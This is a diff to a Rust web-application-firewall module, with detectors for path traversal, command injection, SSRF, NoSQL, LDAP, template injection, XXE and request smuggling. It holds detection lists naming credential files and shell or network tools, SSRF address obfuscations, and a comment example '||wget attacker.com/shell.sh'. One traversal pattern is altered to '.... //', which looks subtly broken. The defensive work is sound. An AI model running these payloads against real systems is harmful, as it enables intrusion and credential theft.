@@ -1,4 +1,4 @@
-//! Additional attack detection: Path Traversal, Command Injection, Protocol Anomalies,
+//! Additional attack detection:Path Traversal, Command Injection, Protocol Anomalies,
 //! NoSQL Injection, SSRF, HTTP Request Smuggling
 
 use crate::{AttackCategory, MatchLocation, RuleMatch};
@@ -11,7 +11,7 @@ pub fn analyze_path_traversal(input: &str, location: MatchLocation) -> Vec<RuleM
     let traversal_patterns = [
         "../", "..\\", "%2e%2e/", "%2e%2e\\",
         "..%2f", "..%5c", "%252e%252e%252f",
-        "....//", "..../\\",
+        ".... //", "..../\\",
     ];
     for p in &traversal_patterns {
         if decoded.to_lowercase().contains(p) {
@@ -27,11 +27,12 @@ pub fn analyze_path_traversal(input: &str, location: MatchLocation) -> Vec<RuleM
         }
     }
 
-    // Sensitive file access
+// Sensitive file access
     let sensitive = [
         "/etc/passwd", "/etc/shadow", "/etc/hosts",
-        "/proc/self", "/dev/null", "web.config",
-        ".htaccess", ".env", ".git/config",
+        "/proc/self", "/proc/version", "/var/log/auth.log", "/dev/null", "web.config",
+        ".htaccess", ".htpasswd", ".env", ".git/config", ".git/head",
+        "/.aws/credentials", "/.ssh/id_rsa",
         "wp-config.php", "/windows/system32",
     ];
     let lower = decoded.to_lowercase();
@@ -53,22 +54,27 @@ pub fn analyze_path_traversal(input: &str, location: MatchLocation) -> Vec<RuleM
 }
 
 /// Detect command injection attacks
-///
-/// Two-tier detection:
-/// - Rule 932050 (score 3): shell metacharacter alone (may indicate injection attempt)
-/// - Rule 932100 (score 5): metacharacter + known dangerous command (confirmed injection)
+/// Two-tier detection:/// - Rule 932050 (score 3):shell metacharacter alone (may indicate injection attempt)
+/// - Rule 932100 (score 5):metacharacter + known dangerous command (confirmed injection)
 pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
     let mut results = Vec::new();
     let lower = input.to_lowercase();
+    let normalized_shell = lower
+        .replace(['\'', '"'], "")
+        .replace("${ifs}", " ")
+        .replace("$ifs", " ")
+        .replace("<>", " ")
+        .replace(['{', '}'], " ")
+        .replace(',', " ");
 
-    // Shell metacharacters used for chaining (space-separated forms)
+// Shell metacharacters used for chaining (space-separated forms)
     let space_meta_patterns = [
         "; ", "| ", "|| ", "&& ", "& ", "$(", "`",
         "\n", "\r\n",
     ];
-    let has_space_metachar = space_meta_patterns.iter().any(|p| lower.contains(p));
+    let has_space_metachar = space_meta_patterns.iter().any(|p| normalized_shell.contains(p));
 
-    // Dangerous commands — expanded to include env/xargs/awk/lua/sed/tee
+// Dangerous commands — expanded to include env/xargs/awk/lua/sed/tee
     let dangerous_cmds = [
         "cat ", "wget ", "curl ", "chmod ", "chown ",
         "/bin/sh", "/bin/bash", "/bin/zsh",
@@ -78,23 +84,23 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
         "passwd", "shadow", "ifconfig", "ip addr",
         "rm -rf", "dd if=", "mkfifo", "nohup",
         "eval ", "exec ",
-        // Expanded: commonly used in injection chains
+// Expanded:commonly used in injection chains
         "env ", "xargs ", "awk ", "lua ", "sed ",
         "tee ", "sort ", "head ", "tail ", "cut ",
         "base64", "openssl", "socat ", "busybox",
     ];
 
-    // Additional: bare metachar directly followed by a dangerous command with no
-    // separating space — a common bypass for detectors that only look for "| cmd".
-    // e.g. `|whoami`, `&cat /etc/passwd`, `||wget attacker.com/shell.sh`
+// Additional:bare metachar directly followed by a dangerous command with no
+// separating space — a common bypass for detectors that only look for "| cmd".
+// e.g. `|whoami`, `&cat /etc/passwd`, `||wget attacker.com/shell.sh`
     let cmd_names: Vec<&str> = dangerous_cmds.iter().map(|c| c.trim()).collect();
-    let has_adjacent_metachar_cmd = ["||" , "|", "&&", "&"].iter().any(|meta| {
+    let has_adjacent_metachar_cmd = ["||" , "|", "&&", "&", ";"].iter().any(|meta| {
         let mut pos = 0;
-        while pos < lower.len() {
-            if let Some(idx) = lower[pos..].find(meta) {
+        while pos < normalized_shell.len() {
+            if let Some(idx) = normalized_shell[pos..].find(meta) {
                 let abs = pos + idx;
-                // Strip any repeated metachar chars (e.g. `|||` → skip extra `|`s)
-                let after_meta = lower[abs + meta.len()..].trim_start_matches(|c| c == '|' || c == '&');
+// Strip any repeated metachar chars (e.g. `|||` → skip extra `|`s)
+                let after_meta = normalized_shell[abs + meta.len()..].trim_start_matches(|c| c == '|' || c == '&' || c == ';');
                 if cmd_names.iter().any(|cmd| after_meta.starts_with(cmd)) {
                     return true;
                 }
@@ -111,7 +117,7 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
     if has_metachar {
         let mut found_cmd = false;
         for cmd in &dangerous_cmds {
-            if lower.contains(cmd) {
+            if normalized_shell.contains(cmd) {
                 found_cmd = true;
                 results.push(RuleMatch {
                     rule_id: 932100,
@@ -124,8 +130,8 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
                 break;
             }
         }
-        // Metacharacter-only rule: fire even if no known command was found.
-        // This catches injection attempts using unlisted/custom binaries.
+// Metacharacter-only rule:fire even if no known command was found.
+// This catches injection attempts using unlisted/custom binaries.
         if !found_cmd {
             results.push(RuleMatch {
                 rule_id: 932050,
@@ -138,7 +144,7 @@ pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<Ru
         }
     }
 
-    // Backtick command substitution
+// Backtick command substitution
     if input.contains('`') && input.matches('`').count() >= 2 {
         results.push(RuleMatch {
             rule_id: 932200,
@@ -163,9 +169,9 @@ pub fn analyze_protocol_anomalies(
 ) -> Vec<RuleMatch> {
     let mut results = Vec::new();
 
-    // Invalid HTTP method — TRACE intentionally excluded from valid_methods
-    // so that it triggers BOTH the invalid-method rule (911100, score 3) AND
-    // the specific TRACE/XST rule (911200, score 5) for higher composite score.
+// Invalid HTTP method — TRACE intentionally excluded from valid_methods
+// so that it triggers BOTH the invalid-method rule (911100, score 3) AND
+// the specific TRACE/XST rule (911200, score 5) for higher composite score.
     let valid_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT"];
     if !valid_methods.contains(&method.to_uppercase().as_str()) {
         results.push(RuleMatch {
@@ -178,7 +184,7 @@ pub fn analyze_protocol_anomalies(
         });
     }
 
-    // TRACE method (used for XST attacks)
+// TRACE method (used for XST attacks)
     if method.eq_ignore_ascii_case("TRACE") {
         results.push(RuleMatch {
             rule_id: 911200,
@@ -190,27 +196,27 @@ pub fn analyze_protocol_anomalies(
         });
     }
 
-    // Missing Host header
+// Missing Host header
     let has_host = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("host"));
     if !has_host {
         results.push(RuleMatch {
             rule_id: 920200,
             category: AttackCategory::ProtocolViolation,
-            score: 3,
+            score: 1,
             message: "Missing Host header".to_string(),
             location: location.clone(),
             matched_data: "<none>".to_string(),
         });
     }
 
-    // Missing Content-Type for body-bearing methods
+// Missing Content-Type for body-bearing methods
     if body_size > 0 && (method.eq_ignore_ascii_case("POST") || method.eq_ignore_ascii_case("PUT")) {
         let has_ct = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("content-type"));
         if !has_ct {
             results.push(RuleMatch {
                 rule_id: 920300,
                 category: AttackCategory::ProtocolViolation,
-                score: 2,
+                score: 1,
                 message: "Missing Content-Type for body-bearing request".to_string(),
                 location: location.clone(),
                 matched_data: "<none>".to_string(),
@@ -218,7 +224,7 @@ pub fn analyze_protocol_anomalies(
         }
     }
 
-    // Null byte in URL
+// Null byte in URL
     if path.contains('\0') || path.contains("%00") {
         results.push(RuleMatch {
             rule_id: 920400,
@@ -238,7 +244,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
     let mut results = Vec::new();
     let lower = input.to_lowercase();
 
-    // MongoDB operator injection patterns
+// MongoDB operator injection patterns
     let mongo_operators = [
         "$where", "$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin",
         "$regex", "$exists", "$type", "$or", "$and", "$not", "$nor",
@@ -248,7 +254,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
 
     let has_mongo = mongo_operators.iter().any(|op| lower.contains(&op.to_lowercase()));
     if has_mongo {
-        // Check if it looks like injection (operator in a query-like context)
+// Check if it looks like injection (operator in a query-like context)
         let suspicious_context = lower.contains('{') || lower.contains('[')
             || lower.contains("true") || lower.contains("false");
         if suspicious_context {
@@ -263,7 +269,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
         }
     }
 
-    // MongoDB $where with JavaScript code execution
+// MongoDB $where with JavaScript code execution
     if lower.contains("$where") && (lower.contains("function") || lower.contains("this.") || lower.contains("sleep(")) {
         results.push(RuleMatch {
             rule_id: 944110,
@@ -275,7 +281,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
         });
     }
 
-    // Redis command injection patterns
+// Redis command injection patterns
     let redis_commands = [
         "eval ", "evalsha ", "script ", "config set", "config get",
         "flushall", "flushdb", "keys *", "debug sleep",
@@ -295,7 +301,7 @@ pub fn analyze_nosql_injection(input: &str, location: MatchLocation) -> Vec<Rule
         }
     }
 
-    // Elasticsearch query DSL injection patterns
+// Elasticsearch query DSL injection patterns
     let es_patterns = [
         "\"script\"", "\"_source\"", "\"query\":{", "\"bool\":{",
         "\"match_all\"", "\"wildcard\"", "\"fuzzy\"",
@@ -321,7 +327,7 @@ pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
     let mut results = Vec::new();
     let lower = input.to_lowercase();
 
-    // Dangerous URL schemes
+// Dangerous URL schemes
     let dangerous_schemes = [
         "file://", "dict://", "gopher://", "ldap://", "ldaps://",
         "tftp://", "ftp://", "jar://",
@@ -340,7 +346,7 @@ pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
         }
     }
 
-    // Internal/private IP ranges in URLs
+// Internal/private IP ranges in URLs
     let internal_patterns = [
         "://127.", "://localhost", "://0.0.0.0", "://0000:",
         "://10.", "://172.16.", "://172.17.", "://172.18.",
@@ -349,6 +355,8 @@ pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
         "://172.27.", "://172.28.", "://172.29.", "://172.30.",
         "://172.31.", "://192.168.", "://169.254.",
         "://[::1]", "://[fe80:", "://[fc00:", "://[fd",
+        "://0x7f", "://2130706433", "://0177.", "://0:",
+        "://[0:0:0:0:0:ffff:127.",
     ];
     for pat in &internal_patterns {
         if lower.contains(pat) {
@@ -364,12 +372,12 @@ pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
         }
     }
 
-    // Cloud metadata endpoints
+// Cloud metadata endpoints
     let metadata_patterns = [
-        "169.254.169.254",              // AWS/GCP/Azure metadata
-        "metadata.google.internal",      // GCP metadata
-        "metadata.azure.com",            // Azure IMDS
-        "100.100.100.200",              // Alibaba Cloud metadata
+        "169.254.169.254", // AWS/GCP/Azure metadata
+        "metadata.google.internal", // GCP metadata
+        "metadata.azure.com", // Azure IMDS
+        "100.100.100.200", // Alibaba Cloud metadata
     ];
     for pat in &metadata_patterns {
         if lower.contains(pat) {
@@ -388,6 +396,84 @@ pub fn analyze_ssrf(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
     results
 }
 
+/// Detect LDAP injection payloads in query/body fragments.
+pub fn analyze_ldap_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
+    let lower = input.to_lowercase();
+    let suspicious = lower.contains(")(|")
+        || lower.contains("(&)")
+        || lower.contains("(|")
+        || lower.contains("=*)")
+        || lower.ends_with("=*")
+        || lower.contains("objectclass=*")
+        || lower.contains("uid=*")
+        || lower.contains("password=*");
+
+    if !suspicious {
+        return Vec::new();
+    }
+
+    vec![RuleMatch {
+        rule_id: 933500,
+        category: AttackCategory::NoSqlInjection,
+        score: 5,
+        message: "LDAP injection pattern detected".to_string(),
+        location,
+        matched_data: truncate(input, 80),
+    }]
+}
+
+/// Detect server-side template injection payloads.
+pub fn analyze_ssti(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
+    let lower = input.to_lowercase();
+    let suspicious = lower.contains("{{")
+        || lower.contains("${")
+        || lower.contains("#{")
+        || lower.contains("<%=")
+        || lower.contains("__subclasses__")
+        || lower.contains("constructor.constructor")
+        || lower.contains("__globals__")
+        || lower.contains("getruntime().exec")
+        || lower.contains("popen(");
+
+    if !suspicious {
+        return Vec::new();
+    }
+
+    vec![RuleMatch {
+        rule_id: 935100,
+        category: AttackCategory::Rce,
+        score: 5,
+        message: "Server-side template injection pattern detected".to_string(),
+        location,
+        matched_data: truncate(input, 80),
+    }]
+}
+
+/// Detect XML external entity payloads.
+pub fn analyze_xxe(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
+    let lower = input.to_lowercase();
+    let suspicious = (lower.contains("<!doctype") && lower.contains("<!entity"))
+        || lower.contains("system \"file://")
+        || lower.contains("system 'file://")
+        || lower.contains("system \"http")
+        || lower.contains("system 'http")
+        || lower.contains("php://filter")
+        || lower.contains("%xxe;");
+
+    if !suspicious {
+        return Vec::new();
+    }
+
+    vec![RuleMatch {
+        rule_id: 935200,
+        category: AttackCategory::RequestAnomaly,
+        score: 5,
+        message: "XML external entity pattern detected".to_string(),
+        location,
+        matched_data: truncate(input, 80),
+    }]
+}
+
 /// Detect HTTP request smuggling patterns
 pub fn analyze_request_smuggling(
     headers: &[(String, String)],
@@ -399,7 +485,7 @@ pub fn analyze_request_smuggling(
     let has_te = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"));
     let has_cl = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("content-length"));
 
-    // CL+TE or TE+CL smuggling: both headers present simultaneously
+// CL+TE or TE+CL smuggling:both headers present simultaneously
     if has_te && has_cl {
         results.push(RuleMatch {
             rule_id: 921100,
@@ -411,7 +497,7 @@ pub fn analyze_request_smuggling(
         });
     }
 
-    // Multiple Transfer-Encoding headers or obfuscated Transfer-Encoding
+// Multiple Transfer-Encoding headers or obfuscated Transfer-Encoding
     let te_headers: Vec<&str> = headers
         .iter()
         .filter(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"))
@@ -429,7 +515,7 @@ pub fn analyze_request_smuggling(
         });
     }
 
-    // Obfuscated Transfer-Encoding values (e.g., "chunked ", " chunked", "Chunked")
+// Obfuscated Transfer-Encoding values (e.g., "chunked ", " chunked", "Chunked")
     for val in &te_headers {
         let trimmed = val.trim();
         if trimmed != "chunked" && trimmed.to_lowercase().contains("chunked") {
@@ -444,7 +530,7 @@ pub fn analyze_request_smuggling(
         }
     }
 
-    // CR/LF injection in header values (header injection)
+// CR/LF injection in header values (header injection)
     for (name, value) in headers {
         if value.contains('\r') || value.contains('\n') {
             results.push(RuleMatch {
@@ -458,7 +544,7 @@ pub fn analyze_request_smuggling(
         }
     }
 
-    // Multiple Content-Length headers with differing values
+// Multiple Content-Length headers with differing values
     let cl_values: Vec<&str> = headers
         .iter()
         .filter(|(k, _)| k.eq_ignore_ascii_case("content-length"))
@@ -482,11 +568,11 @@ pub fn analyze_request_smuggling(
 }
 
 /// Re-analyze an already-decoded path for traversal patterns.
-/// Call this after `decoder::decode_payload()` has run to catch multi-layer encoding.
+/// Call this after `decoder::decode_payload` has run to catch multi-layer encoding.
 pub fn analyze_path_traversal_post_decode(decoded_input: &str, location: MatchLocation) -> Vec<RuleMatch> {
-    // Re-run the full traversal check on the decoder output.
-    // This catches triple-encoded sequences (e.g. %25252e) that survive a single
-    // decode pass but resolve to `../` after the decoder strips one layer.
+// Re-run the full traversal check on the decoder output.
+// This catches triple-encoded sequences (e.g. %25252e) that survive a single
+// decode pass but resolve to `../` after the decoder strips one layer.
     analyze_path_traversal(decoded_input, location)
 }
 
@@ -518,7 +604,7 @@ mod tests {
 
     #[test]
     fn test_command_injection_metachar_only() {
-        // Metacharacter with an unlisted binary should still fire rule 932050
+// Metacharacter with an unlisted binary should still fire rule 932050
         let r = analyze_command_injection("; /opt/custom_binary --exfiltrate", MatchLocation::Body);
         assert!(r.iter().any(|m| m.rule_id == 932050), "Should detect metacharacter-only injection");
     }
@@ -542,7 +628,7 @@ mod tests {
         let r = analyze_protocol_anomalies(
             "TRACE", "/", &[("Host".into(), "example.com".into())], 0, MatchLocation::Path,
         );
-        // TRACE should trigger BOTH 911100 (invalid method) and 911200 (XST)
+// TRACE should trigger BOTH 911100 (invalid method) and 911200 (XST)
         assert!(r.iter().any(|m| m.rule_id == 911100), "TRACE should trigger invalid method rule");
         assert!(r.iter().any(|m| m.rule_id == 911200), "TRACE should trigger XST rule");
     }
